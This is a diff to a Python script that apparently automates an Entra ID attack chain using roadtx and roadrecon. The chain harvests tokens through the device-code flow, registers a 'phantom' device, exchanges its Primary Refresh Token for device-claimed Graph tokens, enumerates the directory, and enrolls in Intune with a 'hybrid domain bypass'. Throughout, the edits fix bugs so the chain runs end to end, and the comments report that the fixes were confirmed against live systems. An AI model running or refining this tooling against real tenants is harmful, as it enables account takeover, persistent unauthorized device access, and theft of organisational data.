@@ -191,8 +191,20 @@ class Logger:
 
 def run_cmd(cmd: list[str], log: Logger, dry_run: bool = False,
             env: Optional[dict] = None, capture: bool = True,
-            timeout: int = 300) -> tuple[int, str, str]:
-    """Execute a command with logging. Returns (returncode, stdout, stderr)."""
+            timeout: int = 300, stream: bool = False) -> tuple[int, str, str]:
+    """Execute a command with logging. Returns (returncode, stdout, stderr).
+
+    `stream=True` forwards each line of output to `log.info()` as it's
+    produced instead of only after the process exits. Required for any
+    command whose stdout is itself the thing an operator needs to see and
+    act on *while it's running* (e.g. `roadtx gettokens --device-code`
+    prints a verification URL + code that's only useful within the
+    command's own timeout window). The non-streaming path uses
+    `subprocess.run(capture_output=True)`, which buffers everything and,
+    on `TimeoutExpired`, discards the partial output entirely — fine for
+    commands where only the final result matters, but it silently
+    swallowed the device-code prompt with no way to recover it, blocking
+    that phase for every caller (confirmed live, not just reasoned about)."""
     cmd_str = " ".join(cmd)
     log.cmd(cmd_str)
 
@@ -201,6 +213,37 @@ def run_cmd(cmd: list[str], log: Logger, dry_run: bool = False,
         return 0, "[dry run]", ""
 
     merged_env = {**os.environ, **(env or {})}
+
+    if stream:
+        try:
+            proc = subprocess.Popen(
+                cmd, stdout=subprocess.PIPE, stderr=subprocess.STDOUT,
+                text=True, bufsize=1, env=merged_env,
+            )
+        except FileNotFoundError:
+            log.error(f"Command not found: {cmd[0]}")
+            return -1, "", "not found"
+        lines: list[str] = []
+        start = time.monotonic()
+        timed_out = False
+        try:
+            for line in proc.stdout:
+                log.info(line.rstrip("\n"))
+                lines.append(line)
+                if time.monotonic() - start > timeout:
+                    timed_out = True
+                    break
+            if not timed_out:
+                proc.wait(timeout=max(0.0, timeout - (time.monotonic() - start)))
+        except subprocess.TimeoutExpired:
+            timed_out = True
+        if timed_out:
+            proc.kill()
+            proc.wait()
+            log.error(f"Command timed out after {timeout}s")
+            return -1, "".join(lines), "timeout"
+        return proc.returncode, "".join(lines), ""
+
     try:
         result = subprocess.run(
             cmd, capture_output=capture, text=True,
@@ -281,6 +324,15 @@ class ChainState:
     hybrid_domain: str = ""
 
     def __post_init__(self):
+        # `roadtx device -a join` lowercases the device name for the cert/key
+        # filenames it writes regardless of the case passed to `-n` — confirmed
+        # live: `-n YOURPC-LQJ2S` produced `yourpc-lqj2s.pem`/`.key` on disk.
+        # Phase 3's own success check (cert_path.exists() and key_path.exists())
+        # was comparing against the original-case name and always missed on a
+        # case-sensitive filesystem, reporting "Device registration failed"
+        # even when roadtx had just printed a real Device ID and saved the
+        # cert. Lowercase here so the state matches what's actually on disk.
+        self.device_name = self.device_name.lower()
         self.device_cert = f"{self.device_name}.pem"
         self.device_key = f"{self.device_name}.key"
         self.intune_device_file = f"{self.device_name}.rtdevice"
@@ -346,7 +398,7 @@ def phase_2_drs_token(state: ChainState, log: Logger, dry_run: bool) -> bool:
         "--device-code",
         "-r", DRS_RESOURCE,
         "-c", AUTH_BROKER_CLIENT_ID,
-    ], log, dry_run, timeout=120)
+    ], log, dry_run, timeout=120, stream=True)
 
     if dry_run:
         state.has_drs_token = True
@@ -478,11 +530,15 @@ def phase_5_prt_exchange(state: ChainState, log: Logger, dry_run: bool) -> bool:
     log.info("Exchanging PRT for AAD Graph token with device claims")
 
     # Exchange for AAD Graph
+    # `--tokenfile` (not `--tokens-file`) — confirmed live against the
+    # installed roadtx build's own --help; the wrong flag name made every
+    # phase 5 run fail with "unrecognized arguments" before roadtx ever
+    # got to the actual PRT exchange.
     rc, stdout, stderr = run_cmd([
         "roadtx", "prtauth",
         "-f", state.prt_file,
         "-r", AAD_GRAPH_RESOURCE,
-        "--tokens-file", state.device_token_file,
+        "--tokenfile", state.device_token_file,
     ], log, dry_run)
 
     combined = stdout + stderr
@@ -500,7 +556,7 @@ def phase_5_prt_exchange(state: ChainState, log: Logger, dry_run: bool) -> bool:
         log.info("Inspecting device-authenticated token claims...")
         rc2, desc_out, _ = run_cmd([
             "roadtx", "describe",
-            "--tokens-file", state.device_token_file,
+            "--tokenfile", state.device_token_file,
         ], log, dry_run)
 
         if "rsa" in desc_out.lower():
@@ -521,7 +577,7 @@ def phase_5_prt_exchange(state: ChainState, log: Logger, dry_run: bool) -> bool:
             "roadtx", "prtauth",
             "-f", state.prt_file,
             "-r", MS_GRAPH_RESOURCE,
-            "--tokens-file", ".roadtools_auth_msgraph",
+            "--tokenfile", ".roadtools_auth_msgraph",
         ], log, dry_run)
 
         return True
@@ -537,7 +593,7 @@ def phase_6_enumerate(state: ChainState, log: Logger, dry_run: bool) -> bool:
 
     rc, stdout, stderr = run_cmd([
         "roadrecon", "gather",
-        "--tokens-file", state.device_token_file,
+        "--tokenfile", state.device_token_file,
         "-d", state.roadrecon_db,
     ], log, dry_run, timeout=600)
 
@@ -683,7 +739,7 @@ def phase_8_intune_enroll(state: ChainState, log: Logger, dry_run: bool) -> bool
         "--device-code",
         "-r", INTUNE_RESOURCE,
         "-c", AUTH_BROKER_CLIENT_ID,
-    ], log, dry_run, timeout=120)
+    ], log, dry_run, timeout=120, stream=True)
 
     # Enroll with hybrid domain bypass
     log.info(f"Enrolling phantom device with hybrid domain bypass: {state.hybrid_domain}")
@@ -797,7 +853,18 @@ def run_chain(args: argparse.Namespace):
 
     # Setup working directory
     ts = datetime.now().strftime("%Y%m%d_%H%M%S")
-    work_dir = Path(args.output_dir) / f"phantom_join_{ts}"
+    # .resolve() BEFORE the chdir below, not after — every later phase does
+    # `state.work_dir / <relative filename>` to check for roadtx's output
+    # files, and roadtx itself is invoked with no explicit cwd (inherits the
+    # process cwd, which becomes work_dir once we chdir into it). Storing
+    # work_dir as the pre-chdir *relative* path (e.g. "." joined with the
+    # dir name) made every one of those checks resolve one level too deep
+    # against the *new* cwd — confirmed live: phase 3 kept reporting "Device
+    # registration failed" even right after roadtx printed a real Device ID
+    # and saved the cert, because cert_path.exists() was checking
+    # work_dir/phantom_join_.../work_dir/phantom_join_.../<name>.pem instead
+    # of work_dir/phantom_join_.../<name>.pem.
+    work_dir = (Path(args.output_dir) / f"phantom_join_{ts}").resolve()
     work_dir.mkdir(parents=True, exist_ok=True)
     original_dir = os.getcwd()
     os.chdir(work_dir)
